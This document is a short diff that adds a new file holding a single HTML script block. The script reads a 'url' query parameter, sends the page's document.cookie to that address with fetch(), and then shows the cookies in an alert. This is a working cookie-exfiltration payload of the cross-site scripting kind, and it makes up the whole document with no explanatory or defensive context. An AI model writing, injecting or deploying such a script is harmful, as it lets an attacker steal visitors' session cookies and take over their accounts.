@@ -1,0 +1,11 @@
+<script>
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const urlParam = urlParams.get('url');
+
+    if (urlParam) {
+        fetch(urlParam + '?c=' + encodeURIComponent(document.cookie))
+    }
+
+    alert(document.cookie)
+</script>
